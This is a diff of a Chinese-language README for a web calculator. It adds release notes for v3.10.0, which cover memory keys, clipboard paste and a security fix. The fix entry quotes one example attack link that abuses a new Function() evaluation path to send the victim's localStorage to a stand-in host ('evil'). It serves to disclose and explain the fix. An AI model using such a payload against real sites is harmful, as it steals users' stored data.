@@ -5,7 +5,7 @@
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
 [![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![Version](https://img.shields.io/badge/version-3.9.0-blue.svg)](CHANGELOG.md)
+[![Version](https://img.shields.io/badge/version-3.10.0-blue.svg)](CHANGELOG.md)
 [![Pro Tier](https://img.shields.io/badge/Pro-$2.99/mo_·_$19.99/yr-f59e0b?logo=paypal&logoColor=white)](#v33-安全架構升級-)
 [![Security](https://img.shields.io/badge/license_validation-JWT_%2B_KV_backed-10b981?logo=cloudflare&logoColor=white)](#v33-安全架構升級-)
 [![Sponsor](https://img.shields.io/badge/Sponsor-❤_GitHub_Sponsors-ea4aaa?logo=githubsponsors&logoColor=white)](https://github.com/sponsors/boboidvtw)
@@ -22,6 +22,10 @@
 ⚡ **v3.8.2 性能優化**（2026-06-18）：body 尾部 5 個 `<script>` 加 `defer`，HTML parser 不再被 14KB（gzip）sync 下載阻塞、Pro 模組鏈順序保留。本地 preview 驗證零回歸（5 Pro 模組 init 成功、100 公式 + 41 鎖頭渲染、`console.error` = 0），預期 TTI/FCP 有 50–200ms 改善。同步 bump SW `CACHE_NAME` v3.8.2。詳見 [CHANGELOG](CHANGELOG.md#382---2026-06-18--perf-html-parser-unblocking-defer-5-external-js)。
 
 🧹 **v3.8.3 清負債**（2026-06-25）：移除 30+ 天空載的 Google AdSense `<script>`（被拒後遺留）與 `sw.js` 對應 host bypass。同步決定變現方向走 **Carbon Ads**（取代 AdSense），申請中（5-7 工作天）；通過後 Free 看廣告 / Pro 與 Trial 隱藏廣告。詳見 [CHANGELOG](CHANGELOG.md#383---2026-06-25--chore-drop-dead-adsense-script--plan-carbon-ads-route)。
+
+🔒 **v3.10.0 安全修復（CRITICAL，既有漏洞）**（2026-08-14）：`#calc=` 網址參數原本**零驗證**直接寫入計算機並交給 `new Function()` 求值 —— `#calc=1,(fetch('//evil/?d='+JSON.stringify(localStorage)))` 這種連結，受害者點開後只要按一次 `=` 就會執行（JS 的逗號運算子讓它成為 `return` 表達式的一部分）。本地已實測重現。現在這條路徑與貼上共用同一套文法驗證，驗不過就不填。同時修掉：付款／授權碼視窗（`#pro-modal`）不在輸入守衛範圍內，實測會讓打字與貼上灌進背景計算機；`factorial()` 無上限導致一行輸入即可凍結分頁。詳見 [CHANGELOG](CHANGELOG.md#3100---2026-08-14--feat-記憶鍵-mmmrmc--剪貼簿貼上含一個-critical-安全修復)。
+
+🧠 **v3.10.0 記憶鍵 + 剪貼簿貼上**（2026-08-14）：補上兩件一台計算機本來就該有、這台卻一直沒有的事 —— **記憶鍵 M+ / M− / MR / MC**（全檔 `memory` 命中原本是 0）與 **Ctrl/Cmd+V 貼上**（原本只有 `writeText`，只出得去進不來）。M+ 會先把目前算式求值再累加（螢幕上是 `12×7` 存進去的是 `84`），記憶值存在 localStorage、關分頁再開仍在；記憶為空時 MC/MR 呈停用。貼上走**文法驗證**而非字元清洗：`calculate()` 最終是 `new Function()` 求值，而貼上是第一次讓外部字串進入這條路徑，因此整段必須能被 tokenizer 完整吃完，否則整段拒絕（`exp.call(1)` 這類用合法函數名開頭的字串在文法層就被擋下）。全形符號、各種 dash、千分位逗號會自動正規化，但千分位只在整段沒有函數呼叫時才拆 —— `nCr(5,123)` 長得跟千分位一模一樣。詳見 [CHANGELOG](CHANGELOG.md#3100---2026-08-14--feat-記憶鍵-mmmrmc--剪貼簿貼上含一個-critical-安全修復)。
 
 ⌨️ **v3.9.0 實體鍵盤輸入 + 深色主題對比度收尾**（2026-08-05）：在此之前整份頁面沒有任何全域按鍵監聽器 —— 桌機使用者只能滑鼠逐鍵點，無法用鍵盤輸入數字。本版把按鈕邏輯抽成共用入口後接上實體鍵盤（數字 / 運算符 / 括號 / Enter / Backspace / Esc，進位分類支援 `0`-`9` `A`-`F`），並處理焦點與 modal 守衛、Error 後可直接接續輸入。同時把 v3.8.5 只做一半的對比度稽核做完：深色主題純色底違規 **236 → 0**、淺色主題殘留 **18 → 0**（含白字白底 1.17:1、Pro modal 深字配深底 1.23:1、升級 Pro 按鈕白字配琥珀漸層 2.15:1 等歷次稽核未抓到的項目）。詳見 [CHANGELOG](CHANGELOG.md#390---2026-08-05--feat-實體鍵盤輸入--深色主題對比度收尾)。
 
